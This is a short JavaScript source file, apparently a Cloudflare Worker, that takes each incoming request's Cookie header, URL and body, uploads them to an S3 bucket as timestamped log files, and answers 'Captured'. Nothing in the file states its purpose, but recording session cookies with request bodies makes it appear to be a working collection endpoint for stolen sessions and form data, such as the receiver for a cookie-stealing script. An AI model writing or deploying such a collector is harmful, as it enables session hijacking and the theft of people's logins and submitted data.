import { AwsClient } from 'aws4fetch';

export default {
  async fetch(request, env, ctx) {
    const aws = new AwsClient({
      accessKeyId: env.AWS_KEY,
      secretAccessKey: env.AWS_SECRET_KEY,
      service: 's3',
      region: env.BUCKET_REGION,
    });

    const body = await request.text();
    const session = request.headers.get('Cookie') || 'no-session';
    const logData = `Session: ${session}\nURL: ${request.url}\nBody:\n${body}`;

    const now = new Date().toISOString();
    const key = `logs/${now}.txt`;

    const s3Url = `https://${env.BUCKET_NAME}.s3.${env.BUCKET_REGION}.amazonaws.com/${key}`;

    const response = await aws.fetch(s3Url, {
      method: 'PUT',
      headers: {
        'Content-Type': 'text/plain',
      },
      body: logData,
    });

    return new Response('Captured', { status: response.status });
  },
};
